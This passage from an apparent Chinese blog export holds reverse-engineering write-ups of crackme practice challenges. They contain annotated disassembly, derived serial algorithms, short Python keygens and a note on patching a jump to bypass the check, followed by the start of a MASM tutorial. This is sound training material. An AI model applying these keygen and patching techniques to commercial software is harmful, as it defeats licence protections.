测试.00481B72                         ;  失败\n0040115D  |.  68 04000000   push 0x4\n```\n\n那么回到上面的问题，ah的值是从哪来的，我们在`004010E8`处可以看到，FPU状态码进了eax  \n那么根据我们的判断`ah \u0026 0x41 != 0`，能得出对FPU状态字有什么要求呢？  \n我们看这张图  \n![](http://ww1.sinaimg.cn/large/c0264382gy1fjo0im7jh7j20g70bqt93.jpg)\n\n也就是说  \n```\n    0100 0001\n\u0026   -x-- -yzt\n----------------\n    真\n其中x代表C3，y代表C2，z代表C1,t代表C0\n```\n\n根据上面的判断，也就是说**只能C3或C0为1**  \n- C3为1的话  \n```asm\n004010E2  |\u003e  DC1D 651B4800 fcomp qword ptr ds:[0x481B65]            ;  st0和[481B65](无限接近0的一个正浮点数)比较，据此设置FPU状态字C0,C2,C3位，并把st0弹到[481B65]\n```\n这段就是st0等于一个无限接近0的浮点数才能使C3为1，但是根据我们之前的`st0 = st0 = 你的输入+520-641`，st0不可能是等于一个无限接近0的浮点数，所以**C3为1排除**  [fcomp命令参考处](http://x86.renejeschke.de/html/file_module_x86_id_87.html)\n- C0为1的话  \nC0为1是怎么来的呢？只有两个地方涉及到了FPU状态字的改变，分别是`4010D7`和`4010E2`  \n`4010E2`处要使C0为1，必须st0小于那个无限接近0的浮点数，这个条件不足以我们判断，接着往上看  \n`4010D7`处要使C0为1，必须st0等于0.0，也就是`你的输入+520-641=0`  [ftst命令参考处](http://x86.renejeschke.de/html/file_module_x86_id_123.html)\n\n所以至此我们就得到了密码  \n密码+520-641=0      ==\u003e     密码=121  \n![](http://ww1.sinaimg.cn/large/c0264382gy1fjo0ir8du4j20am070a9y.jpg)\n\n这个CM怎么说呢，我刚开始是没想到会涉及到浮点寄存器的，因为我还没学这个，不过后来追到快判断的地方时，发现了FPU状态码进入eax参与过程了，然后查了关于FPU 状态寄存器的资料，就可以搞出来了\n","cover":"","link":"2017/09/18/一个涉及到浮点寄存器的cm.html","preview":"\u003cp\u003e这次找小伙伴要了他的一个CM，怎么说呢，这CM让我学到了不少，其实搞出来后感觉不难，就是有不少FPU浮点相关的指令和FPU寄存器完全没学过，查了不少资料，学到了很多\u003c/p\u003e\n","title":"一个涉及到浮点寄存器的CM"},{"content":"\n\n\n\n首先查壳无壳，输入伪码报错，根据报错od查找字符串，定位到错误代码附近，可以看到有个条件跳转，改掉就可以爆破，接下来分析下注册算法，我们周围看看，从最近几个call看，并没有我们输入的用户名在堆栈中出现，那我们直接从这个函数开头往下找，一般一个函数开头是push ebp一段代码用来提升堆栈，找到后我们往下找，注意堆栈，直到我们输入的字符出现，开始细心往下跟  \n\n\n```asm\n00402310   \u003e \\55            push ebp\n00402311   .  8BEC          mov ebp,esp\n00402313   .  83EC 0C       sub esp,0xC\n00402316   .  68 26104000   push \u003cjmp.\u0026MSVBVM50.__vbaExceptHandler\u003e  ;  SE 处理程序安装\n0040231B   .  64:A1 0000000\u003emov eax,dword ptr fs:[0]\n00402321   .  50            push eax                                 ;  Afkayas_.00402191\n00402322   .  64:8925 00000\u003emov dword ptr fs:[0],esp\n00402329   .  81EC B0000000 sub esp,0xB0\n0040232F   .  53            push ebx\n00402330   .  56            push esi\n00402331   .  8B75 08       mov esi,dword ptr ss:[ebp+0x8]           ;  esi -\u003e ASCII \"2@\"\n00402334   .  57            push edi\n00402335   .  8BC6          mov eax,esi                              ;  eax -\u003e ASCII \"2@\"\n00402337   .  83E6 FE       and esi,-0x2\n0040233A   .  8965 F4       mov dword ptr ss:[ebp-0xC],esp\n0040233D   .  83E0 01       and eax,0x1\n00402340   .  8B1E          mov ebx,dword ptr ds:[esi]\n00402342   .  C745 F8 08104\u003emov dword ptr ss:[ebp-0x8],Afkayas_.0040\u003e\n00402349   .  56            push esi\n0040234A   .  8945 FC       mov dword ptr ss:[ebp-0x4],eax           ;  Afkayas_.00402191\n0040234D   .  8975 08       mov dword ptr ss:[ebp+0x8],esi\n00402350   .  FF53 04       call dword ptr ds:[ebx+0x4]              ;  msvbvm50.7404C5C8\n00402353   .  8B83 10030000 mov eax,dword ptr ds:[ebx+0x310]\n00402359   .  33FF          xor edi,edi\n0040235B   .  56            push esi\n0040235C   .  897D E8       mov dword ptr ss:[ebp-0x18],edi\n0040235F   .  897D E4       mov dword ptr ss:[ebp-0x1C],edi\n00402362   .  897D E0       mov dword ptr ss:[ebp-0x20],edi\n00402365   .  897D DC       mov dword ptr ss:[ebp-0x24],edi\n00402368   .  897D D8       mov dword ptr ss:[ebp-0x28],edi\n0040236B   .  897D D4       mov dword ptr ss:[ebp-0x2C],edi\n0040236E   .  897D C4       mov dword ptr ss:[ebp-0x3C],edi\n00402371   .  897D B4       mov dword ptr ss:[ebp-0x4C],edi\n00402374   .  897D A4       mov dword ptr ss:[ebp-0x5C],edi\n00402377   .  897D 94       mov dword ptr ss:[ebp-0x6C],edi\n0040237A   .  8985 40FFFFFF mov dword ptr ss:[ebp-0xC0],eax          ;  Afkayas_.00402191\n00402380   .  FFD0          call eax                                 ;  Afkayas_.00402191\n00402382   .  8D4D D4       lea ecx,dword ptr ss:[ebp-0x2C]\n00402385   .  50            push eax                                 ;  Afkayas_.00402191\n00402386   .  51            push ecx\n00402387   .  FF15 0C414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaObjSe\u003e;  msvbvm50.__vbaObjSet\n0040238D   .  8B9B 00030000 mov ebx,dword ptr ds:[ebx+0x300]\n00402393   .  56            push esi\n00402394   .  8985 50FFFFFF mov dword ptr ss:[ebp-0xB0],eax          ;  Afkayas_.00402191\n0040239A   .  899D 3CFFFFFF mov dword ptr ss:[ebp-0xC4],ebx\n004023A0   .  FFD3          call ebx\n004023A2   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]\n004023A5   .  50            push eax                                 ;  Afkayas_.00402191\n004023A6   .  52            push edx\n004023A7   .  FF15 0C414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaObjSe\u003e;  msvbvm50.__vbaObjSet\n004023AD   .  8BD8          mov ebx,eax                              ;  Afkayas_.00402191\n004023AF   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]\n004023B2   .  51            push ecx\n004023B3   .  53            push ebx\n004023B4   .  8B03          mov eax,dword ptr ds:[ebx]\n004023B6   .  FF90 A0000000 call dword ptr ds:[eax+0xA0]\n004023BC   .  3BC7          cmp eax,edi\n004023BE   .  7D 12         jge short Afkayas_.004023D2\n004023C0   .  68 A0000000   push 0xA0\n004023C5   .  68 5C1B4000   push Afkayas_.00401B5C\n004023CA   .  53            push ebx\n004023CB   .  50            push eax                                 ;  Afkayas_.00402191\n004023CC   .  FF15 04414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaHresu\u003e;  msvbvm50.__vbaHresultCheckObj\n004023D2   \u003e  56            push esi\n004023D3   .  FF95 3CFFFFFF call dword ptr ss:[ebp-0xC4]\n004023D9   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]\n004023DC   .  50            push eax                                 ;  Afkayas_.00402191\n004023DD   .  52            push edx\n004023DE   .  FF15 0C414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaObjSe\u003e;  msvbvm50.__vbaObjSet\n004023E4   .  8BD8          mov ebx,eax                              ;  Afkayas_.00402191\n004023E6   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]\n004023E9   .  51            push ecx\n004023EA   .  53            push ebx\n004023EB   .  8B03          mov eax,dword ptr ds:[ebx]\n004023ED   .  FF90 A0000000 call dword ptr ds:[eax+0xA0]\n004023F3   .  3BC7          cmp eax,edi\n004023F5   .  7D 12         jge short Afkayas_.00402409\n004023F7   .  68 A0000000   push 0xA0\n004023FC   .  68 5C1B4000   push Afkayas_.00401B5C\n00402401   .  53            push ebx\n00402402   .  50            push eax                                 ;  Afkayas_.00402191\n00402403   .  FF15 04414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaHresu\u003e;  msvbvm50.__vbaHresultCheckObj\n00402409   \u003e  8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]\n0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  用户名 -\u003e eax\n00402412   .  50            push eax                                 ; /用户名 -\u003e 堆栈\n00402413   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |\n00402415   .  FF15 E4404000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaLenBs\u003e; \\len(用户名) -\u003e eax\n0040241B   .  8BF8          mov edi,eax                              ;  len(用户名) -\u003e edi\n0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]          ;  用户名 -\u003e ecx\n00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                     ;  len(用户名) * 0x17CFB ==\u003e edi=A6ADD\n00402426   .  51            push ecx                                 ; /String = NULL\n00402427   .  0F80 91020000 jo Afkayas_.004026BE                     ; |\n0040242D   .  FF15 F8404000 call dword ptr ds:[\u003c\u0026MSVBVM50.#rtcAnsiVa\u003e; \\用户名去掉首字母 -\u003e edx\n00402433   .  0FBFD0        movsx edx,ax\n00402436   .  03FA          add edi,edx\n00402438   .  0F80 80020000 jo Afkayas_.004026BE\n0040243E   .  57            push edi                                 ;  len(用户名) * 0x17CFB 入栈-\u003e ebp-D4\n0040243F   .  FF15 E0404000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaStrI4\u003e;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  -\u003e eax\n00402445   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191\n00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]\n0040244A   .  FF15 70414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaStrMo\u003e;  msvbvm50.__vbaStrMove\n00402450   .  8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]\n00402456   .  50            push eax                                 ;  Afkayas_.00402191\n00402457   .  57            push edi                                 ;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  入栈  -\u003e ebp-D4\n00402458   .  FF93 A4000000 call dword ptr ds:[ebx+0xA4]\n0040245E   .  85C0          test eax,eax                             ;  Afkayas_.00402191\n00402460   .  7D 12         jge short Afkayas_.00402474\n00402462   .  68 A4000000   push 0xA4\n00402467   .  68 5C1B4000   push Afkayas_.00401B5C\n0040246C   .  57            push edi\n0040246D   .  50            push eax                                 ;  Afkayas_.00402191\n0040246E   .  FF15 04414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaHresu\u003e;  msvbvm50.__vbaHresultCheckObj\n00402474   \u003e  8D45 E0       lea eax,dword ptr ss:[ebp-0x20]\n00402477   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]\n0040247A   .  50            push eax                                 ;  Afkayas_.00402191\n0040247B   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]\n0040247E   .  51            push ecx\n0040247F   .  52            push edx\n00402480   .  6A 03         push 0x3\n00402482   .  FF15 5C414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaFreeS\u003e;  msvbvm50.__vbaFreeStrList\n00402488   .  83C4 10       add esp,0x10\n0040248B   .  8D45 D4       lea eax,dword ptr ss:[ebp-0x2C]\n0040248E   .  8D4D D8       lea ecx,dword ptr ss:[ebp-0x28]\n00402491   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]\n00402494   .  50            push eax                                 ;  Afkayas_.00402191\n00402495   .  51            push ecx\n00402496   .  52            push edx\n00402497   .  6A 03         push 0x3\n00402499   .  FF15 F4404000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaFreeO\u003e;  msvbvm50.__vbaFreeObjList\n0040249F   .  8B06          mov eax,dword ptr ds:[esi]\n004024A1   .  83C4 10       add esp,0x10\n004024A4   .  56            push esi\n004024A5   .  FF90 04030000 call dword ptr ds:[eax+0x304]\n004024AB   .  8B1D 0C414000 mov ebx,dword ptr ds:[\u003c\u0026MSVBVM50.__vbaOb\u003e;  msvbvm50.__vbaObjSet\n004024B1   .  50            push eax                                 ;  Afkayas_.00402191\n004024B2   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]\n004024B5   .  50            push eax                                 ;  Afkayas_.00402191\n004024B6   .  FFD3          call ebx                                 ;  \u003c\u0026MSVBVM50.__vbaObjSet\u003e\n004024B8   .  8BF8          mov edi,eax                              ;  Afkayas_.00402191\n004024BA   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]\n004024BD   .  52            push edx\n004024BE   .  57            push edi\n004024BF   .  8B0F          mov ecx,dword ptr ds:[edi]\n004024C1   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]\n004024C7   .  85C0          test eax,eax                             ;  Afkayas_.00402191\n004024C9   .  7D 12         jge short Afkayas_.004024DD\n004024CB   .  68 A0000000   push 0xA0\n004024D0   .  68 5C1B4000   push Afkayas_.00401B5C\n004024D5   .  57            push edi\n004024D6   .  50            push eax                                 ;  Afkayas_.00402191\n004024D7   .  FF15 04414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaHresu\u003e;  msvbvm50.__vbaHresultCheckObj\n004024DD   \u003e  56            push esi\n004024DE   .  FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]\n004024E4   .  50            push eax                                 ;  Afkayas_.00402191\n004024E5   .  8D45 D8       lea eax,dword ptr ss:[ebp-0x28]\n004024E8   .  50            push eax                                 ;  Afkayas_.00402191\n004024E9   .  FFD3          call ebx\n004024EB   .  8BF0          mov esi,eax                              ;  Afkayas_.00402191\n004024ED   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]\n004024F0   .  52            push edx\n004024F1   .  56            push esi\n004024F2   .  8B0E          mov ecx,dword ptr ds:[esi]\n004024F4   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]\n004024FA   .  85C0          test eax,eax                             ;  Afkayas_.00402191\n004024FC   .  7D 12         jge short Afkayas_.00402510\n004024FE   .  68 A0000000   push 0xA0\n00402503   .  68 5C1B4000   push Afkayas_.00401B5C\n00402508   .  56            push esi\n00402509   .  50            push eax                                 ;  Afkayas_.00402191\n0040250A   .  FF15 04414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaHresu\u003e;  msvbvm50.__vbaHresultCheckObj\n00402510   \u003e  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]          ;  user32.77D2BBF7\n00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]\n00402516   .  8B3D 00414000 mov edi,dword ptr ds:[\u003c\u0026MSVBVM50.__vbaSt\u003e;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 -\u003e ecx       密码 -\u003e eax\n0040251C   .  50            push eax                                 ;  Afkayas_.00402191\n0040251D   .  68 701B4000   push Afkayas_.00401B70                   ;  \"AKA-\"入栈\n00402522   .  51            push ecx                                 ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈\n00402523   .  FFD7          call edi                                 ; \\\"AKA-\"+\"十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值\"   -\u003e  eax\n00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[\u003c\u0026MSVBVM50.__vbaSt\u003e;  msvbvm50.__vbaStrMove\n0040252B   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191\n0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]\n00402530   .  FFD3          call ebx                                 ;  \u003c\u0026MSVBVM50.__vbaStrMove\u003e\n00402532   .  50            push eax                                 ;  Afkayas_.00402191\n00402533   .  FF15 28414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaStrCm\u003e;  msvbvm50.__vbaStrCmp\n00402539   .  8BF0          mov esi,eax                              ;  Afkayas_.00402191\n0040253B   .  8D55 E0       lea edx,dword ptr ss:[ebp-0x20]\n0040253E   .  F7DE          neg esi\n00402540   .  8D45 E8       lea eax,dword ptr ss:[ebp-0x18]\n00402543   .  52            push edx\n00402544   .  1BF6          sbb esi,esi\n00402546   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]\n00402549   .  50            push eax                                 ;  Afkayas_.00402191\n0040254A   .  46            inc esi\n0040254B   .  51            push ecx\n0040254C   .  6A 03         push 0x3\n0040254E   .  F7DE          neg esi\n00402550   .  FF15 5C414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaFreeS\u003e;  msvbvm50.__vbaFreeStrList\n00402556   .  83C4 10       add esp,0x10\n00402559   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]\n0040255C   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]\n0040255F   .  52            push edx\n00402560   .  50            push eax                                 ;  Afkayas_.00402191\n00402561   .  6A 02         push 0x2\n00402563   .  FF15 F4404000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaFreeO\u003e;  msvbvm50.__vbaFreeObjList\n00402569   .  83C4 0C       add esp,0xC\n0040256C   .  B9 04000280   mov ecx,0x80020004\n00402571   .  B8 0A000000   mov eax,0xA\n00402576   .  894D 9C       mov dword ptr ss:[ebp-0x64],ecx\n00402579   .  66:85F6       test si,si\n0040257C   .  8945 94       mov dword ptr ss:[ebp-0x6C],eax          ;  Afkayas_.00402191\n0040257F   .  894D AC       mov dword ptr ss:[ebp-0x54],ecx\n00402582   .  8945 A4       mov dword ptr ss:[ebp-0x5C],eax          ;  Afkayas_.00402191\n00402585   .  894D BC       mov dword ptr ss:[ebp-0x44],ecx\n00402588   .  8945 B4       mov dword ptr ss:[ebp-0x4C],eax          ;  Afkayas_.00402191\n0040258B   .  74 58         je short Afkayas_.004025E5\n0040258D   .  68 801B4000   push Afkayas_.00401B80                   ;  You Get It\n00402592   .  68 9C1B4000   push Afkayas_.00401B9C                   ;  \\r\\n\n00402597   .  FFD7          call edi\n00402599   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191\n0040259B   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]\n0040259E   .  FFD3          call ebx\n004025A0   .  50            push eax                                 ;  Afkayas_.00402191\n004025A1   .  68 A81B4000   push Afkayas_.00401BA8                   ;  KeyGen It Now\n004025A6   .  FFD7          call edi\n004025A8   .  8D4D 94       lea ecx,dword ptr ss:[ebp-0x6C]\n004025AB   .  8945 CC       mov dword ptr ss:[ebp-0x34],eax          ;  Afkayas_.00402191\n004025AE   .  8D55 A4       lea edx,dword ptr ss:[ebp-0x5C]\n004025B1   .  51            push ecx\n004025B2   .  8D45 B4       lea eax,dword ptr ss:[ebp-0x4C]\n004025B5   .  52            push edx\n004025B6   .  50            push eax                                 ;  Afkayas_.00402191\n004025B7   .  8D4D C4       lea ecx,dword ptr ss:[ebp-0x3C]\n004025BA   .  6A 00         push 0x0\n004025BC   .  51            push ecx\n004025BD   .  C745 C4 08000\u003emov dword ptr ss:[ebp-0x3C],0x8\n004025C4   .  FF15 10414000 call dword ptr ds:[\u003c\u0026MSVBVM50.#rtcMsgBox\u003e;  msvbvm50.rtcMsgBox\n004025CA   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]\n004025CD   .  FF15 80414000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaFreeS\u003e;  msvbvm50.__vbaFreeStr\n004025D3   .  8D55 94       lea edx,dword ptr ss:[ebp-0x6C]\n004025D6   .  8D45 A4       lea eax,dword ptr ss:[ebp-0x5C]\n004025D9   .  52            push edx\n004025DA   .  8D4D B4       lea ecx,dword ptr ss:[ebp-0x4C]\n004025DD   .  50            push eax                                 ;  Afkayas_.00402191\n004025DE   .  8D55 C4       lea edx,dword ptr ss:[ebp-0x3C]\n004025E1   .  51            push ecx\n004025E2   .  52            push edx\n004025E3   .  EB 56         jmp short Afkayas_.0040263B\n004025E5   \u003e  68 C81B4000   push Afkayas_.00401BC8                   ;  You Get Wrong\n004025EA   .  68 9C1B4000   push Afkayas_.00401B9C                   ;  \\r\\n\n004025EF   .  FFD7          call edi\n004025F1   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191\n004025F3   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]\n004025F6   .  FFD3          call ebx\n004025F8   .  50            push eax                                 ;  Afkayas_.00402191\n004025F9   .  68 E81B4000   push Afkayas_.00401BE8                   ;  Try Again\n```\n\n通过分析可以看到加密关键代码是  \n```asm\n0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  用户名 -\u003e eax\n00402412   .  50            push eax                                 ; /用户名 -\u003e 堆栈\n00402413   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |\n00402415   .  FF15 E4404000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaLenBs\u003e; \\len(用户名) -\u003e eax\n0040241B   .  8BF8          mov edi,eax                              ;  len(用户名) -\u003e edi\n0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]          ;  用户名 -\u003e ecx\n00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                     ;  len(用户名) * 0x17CFB ==\u003e edi=A6ADD\n00402426   .  51            push ecx                                 ; /String = NULL\n00402427   .  0F80 91020000 jo Afkayas_.004026BE                     ; |\n0040242D   .  FF15 F8404000 call dword ptr ds:[\u003c\u0026MSVBVM50.#rtcAnsiVa\u003e; \\用户名去掉首字母 -\u003e edx\n0040243E   .  57            push edi                                 ;  len(用户名) * 0x17CFB 入栈-\u003e ebp-D4\n0040243F   .  FF15 E0404000 call dword ptr ds:[\u003c\u0026MSVBVM50.__vbaStrI4\u003e;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  -\u003e eax\n0040251D   .  68 701B4000   push Afkayas_.00401B70                   ;  \"AKA-\"入栈\n00402522   .  51            push ecx                                 ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈\n00402523   .  FFD7          call edi                                 ; \\\"AKA-\"+\"十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值\"   -\u003e  eax\n```\n\n可以看出流程就是 \"AKA-\"+\"十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值\"  \n\n写注册机（Python）  \n```python\nimport sys\n\nusername = sys.argv[1]\npwend = len(username) * 0x17CFB + ord(username[0])\npassword = \"AKA-%d\"%pwend\nprint(password)\n```\n\n测试结果  \n```bash\nC:\\Users\\Administrator\\Desktop\u003epython 1.py akkuman\nAKA-682814\n```\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1fjle318xy9j20ir0abgu6.jpg)\n","cover":"","link":"2017/09/16/160crackme-002.html","preview":"\u003cp\u003e首先查壳无壳，输入伪码报错，根据报错od查找字符串，定位到错误代码附近，可以看到有个条件跳转，改掉就可以爆破，接下来分析下注册算法，我们周围看看，从最近几个call看，并没有我们输入的用户名在堆栈中出现，那我们直接从这个函数开头往下找，一般一个函数开头是push ebp一段代码用来提升堆栈，找到后我们往下找，注意堆栈，直到我们输入的字符出现，开始细心往下跟\u003c/p\u003e\n","title":"160CrackMe练手 002"},{"content":"\n\n\n\npeid判断无壳，打开输入伪码注册，根据报错od查找字符串  \n接下来定位到字符串周边代码  \n\n\n```asm\n0042FA15  |.  8D55 F0       lea edx,[local.4]\n0042FA18  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]\n0042FA1E  |.  E8 35B0FEFF   call Acid_bur.0041AA58\n0042FA23  |.  8B45 F0       mov eax,[local.4]\n0042FA26  |.  0FB640 03     movzx eax,byte ptr ds:[eax+0x3]\n0042FA2A  |.  6BF0 0B       imul esi,eax,0xB\n0042FA2D  |.  8D55 EC       lea edx,[local.5]\n0042FA30  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]\n0042FA36  |.  E8 1DB0FEFF   call Acid_bur.0041AA58\n0042FA3B  |.  8B45 EC       mov eax,[local.5]                        ;  堆栈中可看到[local.5和4]都是你输入的用户名\n0042FA3E  |.  0FB640 02     movzx eax,byte ptr ds:[eax+0x2]\n0042FA42  |.  6BC0 0E       imul eax,eax,0xE\n0042FA45  |.  03F0          add esi,eax\n0042FA47  |.  8935 58174300 mov dword ptr ds:[0x431758],esi\n0042FA4D  |.  A1 6C174300   mov eax,dword ptr ds:[0x43176C]\n0042FA52  |.  E8 D96EFDFF   call Acid_bur.00406930\n0042FA57  |.  83F8 04       cmp eax,0x4                              ;  如果用户名长度大于等于4跳转\n0042FA5A  |.  7D 1D         jge short Acid_bur.0042FA79\n0042FA5C  |.  6A 00         push 0x0\n0042FA5E  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  Try Again!\n0042FA63  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  Sorry , The serial is incorect !\n0042FA68  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]\n0042FA6D  |.  8B00          mov eax,dword ptr ds:[eax]\n0042FA6F  |.  E8 FCA6FFFF   call Acid_bur.0042A170\n0042FA74  |.  E9 BE000000   jmp Acid_bur.0042FB37\n0042FA79  |\u003e  8D55 F0       lea edx,[local.4]\n0042FA7C  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]\n0042FA82  |.  E8 D1AFFEFF   call Acid_bur.0041AA58\n0042FA87  |.  8B45 F0       mov eax,[local.4]                        ;  取你输入的用户名\n0042FA8A  |.  0FB600        movzx eax,byte ptr ds:[eax]              ;  取用户名的第一个字母放入eax\n0042FA8D  |.  F72D 50174300 imul dword ptr ds:[0x431750]             ;  eax = eax * 29h\n0042FA93  |.  A3 50174300   mov dword ptr ds:[0x431750],eax\n0042FA98  |.  A1 50174300   mov eax,dword ptr ds:[0x431750]\n0042FA9D  |.  0105 50174300 add dword ptr ds:[0x431750],eax          ;  [0x431750] = eax * 2\n0042FAA3  |.  8D45 FC       lea eax,[local.1]\n0042FAA6  |.  BA ACFB4200   mov edx,Acid_bur.0042FBAC                ;  CW\n0042FAAB  |.  E8 583CFDFF   call Acid_bur.00403708                   ;  观察堆栈可发现\"CW\"放入了[local.1]\n0042FAB0  |.  8D45 F8       lea eax,[local.2]\n0042FAB3  |.  BA B8FB4200   mov edx,Acid_bur.0042FBB8                ;  CRACKED\n0042FAB8  |.  E8 4B3CFDFF   call Acid_bur.00403708                   ;  观察堆栈可发现\"CRACKED\"放入了[local.2]\n0042FABD  |.  FF75 FC       push [local.1]                           ;  Acid_bur.0042FBAC\n0042FAC0  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  -  ;两个push把\"CW\"和\"-\"入栈\n0042FAC5  |.  8D55 E8       lea edx,[local.6]\n0042FAC8  |.  A1 50174300   mov eax,dword ptr ds:[0x431750]\n0042FACD  |.  E8 466CFDFF   call Acid_bur.00406718                   ;  用户名第一个字母*29*2的值放入[local.6]\n0042FAD2  |.  FF75 E8       push [local.6]\n0042FAD5  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  -\n0042FADA  |.  FF75 F8       push [local.2]                           ;  \"用户名第一个字母*29*2\",\"-\",\"CRACKED\"入栈\n0042FADD  |.  8D45 F4       lea eax,[local.3]\n0042FAE0  |.  BA 05000000   mov edx,0x5\n0042FAE5  |.  E8 C23EFDFF   call Acid_bur.004039AC                   ;  CW-算好的数据-CRACKED  放入[local.3]\n0042FAEA  |.  8D55 F0       lea edx,[local.4]\n0042FAED  |.  8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]\n0042FAF3  |.  E8 60AFFEFF   call Acid_bur.0041AA58\n0042FAF8  |.  8B55 F0       mov edx,[local.4]                        ;  取出你输入的密码=\u003eedx\n0042FAFB  |.  8B45 F4       mov eax,[local.3]                        ;  正确密码=\u003eeax\n0042FAFE  |.  E8 F93EFDFF   call Acid_bur.004039FC\n0042FB03  |.  75 1A         jnz short Acid_bur.0042FB1F              ;  判断密码是否正确\n0042FB05  |.  6A 00         push 0x0\n0042FB07  |.  B9 CCFB4200   mov ecx,Acid_bur.0042FBCC                ;  Congratz !!\n0042FB0C  |.  BA D8FB4200   mov edx,Acid_bur.0042FBD8                ;  Good job dude =)\n0042FB11  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]\n0042FB16  |.  8B00          mov eax,dword ptr ds:[eax]\n0042FB18  |.  E8 53A6FFFF   call Acid_bur.0042A170\n0042FB1D  |.  EB 18         jmp short Acid_bur.0042FB37\n0042FB1F  |\u003e  6A 00         push 0x0\n0042FB21  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  Try Again!\n0042FB26  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  Sorry , The serial is incorect !\n```\n\n注册算法就是password = \"CW-\" + 取用户名第一位asciix29x2 + \"-CRACKED\"  \n\n注册机（python）：  \n```python\nimport sys\n\nusername = sys.argv[1]\npassword = ord(username[0])*0x29*0x2\nprint(\"password:\"+\"CW-\"+\"%d\"%(password)+\"-CRACKED\")\n```\n\n测试：  \n```bash\nC:\\Users\\Administrator\\Desktop\u003epython 1.py akkuman\npassword:CW-7954-CRACKED\n```\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1fjkbn9nb37j20di068407.jpg)\n","cover":"","link":"2017/09/15/160crackme-001.html","preview":"\u003cp\u003epeid判断无壳，打开输入伪码注册，根据报错od查找字符串\u003cbr /\u003e\n接下来定位到字符串周边代码\u003c/p\u003e\n","title":"160CrackMe练手 001"},{"content":"\n\n\n\n## 内存模式\n```asm\n\t\t.386\n\t\t.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个\n\t\toption casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式\n```\n\n1. 指定使用的指令集\n2. .model语句\n```\n.model 内存模式[,语言模式][,其他模式]\n```\n\n**内存模式**\n\n模式 | 内存使用方式\n-----|-------\ntiny   | 用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内\nsmall | 